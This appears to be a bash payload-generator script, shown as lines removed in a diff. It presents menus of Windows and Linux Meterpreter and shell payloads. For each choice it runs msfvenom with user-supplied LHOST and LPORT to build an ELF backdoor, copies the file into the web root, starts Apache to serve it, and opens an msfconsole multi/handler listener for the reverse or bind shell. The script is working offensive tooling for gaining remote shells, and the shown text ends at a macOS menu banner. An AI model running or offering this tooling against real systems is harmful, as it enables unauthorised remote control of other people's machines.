-PAYLOADS
-=========== $BLUE
-
-METERPRETER
-===========$GREEN
-1 $BLUE > windows/meterpreter/reverse_tcp $GREEN
-2 $BLUE > windows/meterpreter/reverse_http $GREEN
-3 $BLUE > windows/meterpreter/reverse_https $GREEN
-4 $BLUE > windows/meterpreter/bind_hidden_ipknock_tcp $BLUE
-
-
-
-SHELL
-========$GREEN
-5 $BLUE > windows/shell/reverse_tcp $GREEN
-6 $BLUE > windows/x64/shell/reverse_tcp $GREEN
-7 $BLUE > windows/shell/reverse_ipv6_tcp $GREEN
-8 $BLUE > windows/shell/reverse_nonx_tcp $GREEN
-9 $BLUE > windows/shell/reverse_ord_tcp $GREEN
-10$BLUE > windows/shell/reverse_tcp_allports $GREEN
-
-
-11$BLUE >$RED Exit $GREEN 
-
-
-!
-echo "============================================="$BLUE
-echo
-echo -n "choice payload :$RED "
-read ch
-case $ch in
-1)winre ;;
-2)winhtt ;;
-3)winhttps ;;
-4)metbind ;;
-5)sheel ;;
-6)sh_x64 ;;
-7)sh_ipv6 ;;
-8)sh_non ;;
-9)sh_ord ;;
-10)sh_allports ;;
-11)exie ;;
-*) echo "\"$ch\":$RED[x]$BLUE The error of your choice does not exist"; sleep 2 ;;
-esac
-wine
-}
-
-linre () {
-clear
-echo
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [elf] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
-echo "$BLUE PAYLOAD    $GREEN:>$RED linux/x86/meterpreter/reverse_tcp $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/html/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-echo
-echo
-sleep 1
-echo
-lin=.elf
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$host LPORT=$port -a x86 --platform Linux -f elf > $hh/Desktop/Output/$name$lin"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$lin
-cp $name$lin /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-sleep 1
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
-xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit -j'"
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-linu2 () {
-clear
-echo
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [elf] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
-echo "$BLUE PAYLOAD    $GREEN:>$RED linux/aarch64/meterpreter_reverse_tcp $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/html/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-echo
-echo
-sleep 1
-lin=.elf
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p linux/aarch64/meterpreter_reverse_tcp LHOST=$host LPORT=$port -f elf > $hh/Desktop/Output/$name$lin"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$lin
-cp $name$lin /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
-xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD linux/aarch64/meterpreter_reverse_tcp; exploit -j'"
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-linu3 () {
-clear
-echo
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [elf] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                        
-echo "$BLUE PAYLOAD    $GREEN:>$RED linux/aarch64/meterpreter_reverse_http $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/html/$name $GREEN"  
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-lin=.elf
-xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p linux/aarch64/meterpreter_reverse_http LHOST=$host LPORT=$port -f elf > $hh/Desktop/Output/$name$lin"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$lin
-cp $name$lin /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
-xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD linux/aarch64/meterpreter_reverse_http; exploit -j'"
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-
-linu4 () {
-clear
-echo
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [elf] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                              
-echo "$BLUE PAYLOAD    $GREEN:>$RED linux/aarch64/meterpreter_reverse_https $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/html/$name $GREEN"  
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-lin=.elf
-xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p linux/aarch64/meterpreter_reverse_https LHOST=$host LPORT=$port -f elf > $hh/Desktop/Output/$name$lin"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$lin
-cp $name$lin /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
-xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD linux/aarch64/meterpreter_reverse_https; exploit -j'"
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-linu5 () {
-clear
-echo
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [elf] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
-echo "$BLUE PAYLOAD    $GREEN:>$RED linux/x86/shell/reverse_tcp $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/html/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-lin=.elf
-xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p linux/x86/shell/reverse_tcp LHOST=$host LPORT=$port -a x86 --platform Linux -f elf > $hh/Desktop/Output/$name$elf"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$lin
-cp $name$lin /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
-xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD linux/x86/shell/reverse_tcp; exploit -j'"
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-linu6 () {
-clear
-echo
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [elf] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                           
-echo "$BLUE PAYLOAD    $GREEN:>$RED linux/x86/shell/bind_ipv6_tcp $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/html/$name $GREEN"   
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-lin=.elf
-xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p linux/x86/shell/bind_ipv6_tcp LHOST=$host LPORT=$port -a x86 --platform Linux -f elf > $hh/Desktop/Output/$name$lin"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$lin
-cp $name$lin /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
-xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD linux/x86/shell/bind_ipv6_tcp; exploit -j'"
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-linu7 () {
-clear
-echo
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [elf] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                            
-echo "$BLUE PAYLOAD    $GREEN:>$RED linux/x86/shell/bind_tcp $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/html/$name $GREEN"  
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-lin=.elf
-xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p linux/x86/shell/bind_tcp LHOST=$host LPORT=$port -a x86 --platform Linux -f elf > $hh/Desktop/Output/$name$lin"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$lin
-cp $name$lin /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
-xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD linux/x86/shell/bind_tcp; exploit -j'"
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-
-linu8 () {
-clear
-echo
-echo
-echo "please wait.......... "
-sleep 2
-clear
-echo ""$BLUE
-echo "------------------------------------------"
-echo "Your Local IP Address:[ $myip             "
-echo "                                          "
-echo "Your Public IP Address:[ $myip2           "       
-echo "                                          "
-echo "------------------------------------------"
-echo "" $GREEN
-echo -n "Enter LHOST=$RED"
-read host
-echo ""$GREEN
-sleep 1
-echo "LHOST==>$BLUE $host "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter LPORT=$RED"
-read port
-echo $GREEN
-sleep 1
-echo "LPORT==>$BLUE $port"$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-echo -n "Enter name for payload=$RED"
-read name
-echo $GREEN
-sleep 1
-echo "NAME==>$BLUE $name "$GREEN
-echo
-echo "==========================="
-sleep 1
-echo
-clear
-echo
-echo
-echo " Payload [elf] Final Config:       "
-echo "==================================="
-echo "$BLUE LHOST      $GREEN:>$RED $host $GREEN"                                                                     
-echo "$BLUE LPORT      $GREEN:>$RED $port $GREEN"                                           
-echo "$BLUE NAME       $GREEN:>$RED $name $GREEN"                                             
-echo "$BLUE PAYLOAD    $GREEN:>$RED linux/x86/shell/reverse_ipv6_tcp $GREEN "              
-echo "$BLUE SAVE IN    $GREEN:>$RED /root/Desktop/Output/$name and /var/www/html/$name $GREEN"  
-sleep 3
-cd $hh/Desktop/
-if [ -d Output ];then
-echo
-echo "Found Output "
-sleep 1
-else
-mkdir Output
-fi
-cd ..
-echo
-echo
-sleep 1
-echo
-echo $BLUE"[*]$RED:$GREEN Create $RED [$BLUE $name $RED] "
-sleep 1
-lin=.elf
-xterm -T "DHH - Create [$name]" -geometry 99x23 -e "msfvenom -p linux/x86/shell/reverse_ipv6_tcp LHOST=$host LPORT=$port -a x86 --platform Linux -f elf > $hh/Desktop/Output/$name$lin"
-echo
-echo $BLUE"[*]$RED:$GREEN Done! "
-sleep 1
-echo
-echo "$BLUE[*]$GREEN cp$RED:$BLUE[$RED $name $GREEN to $RED /var/www/html/$name$BLUE ]"
-cd $hh/Desktop/Output/
-chmod +x $name$lin
-cp $name$lin /var/www/html
-echo
-echo "Done ! "
-sleep 2
-echo "" $GREEN
-echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
-sleep 2
-xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
-         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
-sleep 2
-echo 
-echo "[*]Done apache server has been started " 
-sleep 2
-echo
-echo
-echo "$RED Done Payload has been Created in$GREEN ->>>$BLUE[ /root/Desktop/Output/$name and /var/www/html/$name ]"
-echo
-echo
-sleep 7
-clear
-echo
-echo
-echo $BLUE" WHAT  YOU  WANT  "
-echo $BLUE"================= "
-echo
-echo "1 - create Listener  on [$GREEN $name $BLUE]"
-echo "2 - back to the menu " $GREEN
-echo
-echo -n "Enter choice ->> "$RED
-read choice
-if [ $choice = 1 ];then
-clear
-echo
-echo
-echo "starting Listener  on $BLUE[ $name ]"
-sleep 1
-xterm -T "DHH - [$name] Listenner" -geometry 99x23 -e " msfconsole -x 'use exploit/multi/handler; set LHOST $host; set LPORT $port; set PAYLOAD linux/x86/shell/reverse_ipv6_tcp; exploit -j'"
-else
-
-if [ $choice = 2 ];then
-clear
-fi
-fi
-
-}
-
-
-
-function linu  {
-
-clear
-
-cat << ! 
-
-$RED
-┌─┐─┐ ┬┌─┐┬  ┌─┐┬┌┬┐  ╦  ┬┌┐┌┬ ┬─┐ ┬
-├┤ ┌┴┬┘├─┘│  │ ││ │   ║  │││││ │┌┴┬┘
-└─┘┴ └─┴  ┴─┘└─┘┴ ┴   ╩═╝┴┘└┘└─┘┴ └─$BLUE
-
-PAYLOADS
-=========
-
-
-METERPRETER
-===========$GREEN 
-1 $BLUE > linux/x86/meterpreter/reverse_tcp $GREEN
-2 $BLUE > linux/aarch64/meterpreter_reverse_tcp $GREEN
-3 $BLUE > linux/aarch64/meterpreter_reverse_http $GREEN
-4 $BLUE > linux/aarch64/meterpreter_reverse_https $BLUE
-
-SHEEL
-========$GREEN
-5 $BLUE > linux/x86/shell/reverse_tcp $GREEN
-6 $BLUE > linux/x86/shell/bind_ipv6_tcp $GREEN
-7 $BLUE > linux/x86/shell/bind_tcp $GREEN
-8 $BLUE > linux/x86/shell/reverse_ipv6_tcp $GREEN
-
-9 $BLUE >$RED EXIT $GREEN   
-
-!
-echo "============================================="
-echo
-echo -n "Choice pyload :>$RED "
-read linu
-case $linu in
-1)linre ;;
-2)linu2 ;;
-3)linu3 ;;
-4)linu4 ;;
-5)linu5 ;;
-6)linu6 ;;
-7)linu7 ;;
-8)linu8 ;;
-9)exie ;;
-*) echo "\"$linu\":$RED[x]$BLUE The error of your choice does not exist"; sleep 2 ;;
-esac
-linu
-
-}
-
-
-
-
-mac () {
-clear
-
-cat << !
-
-$RED
-
-┌─┐─┐ ┬┌─┐┬  ┌─┐┬┌┬┐  ╔╦╗╔═╗╔═╗  ╔═╗╔═╗
-├┤ ┌┴┬┘├─┘│  │ ││ │   ║║║╠═╣║    ║ ║╚═╗
-└─┘┴ └─┴  ┴─┘└─┘┴ ┴   ╩ ╩╩ ╩╚═╝  ╚═╝╚═╝$GREEN
-!
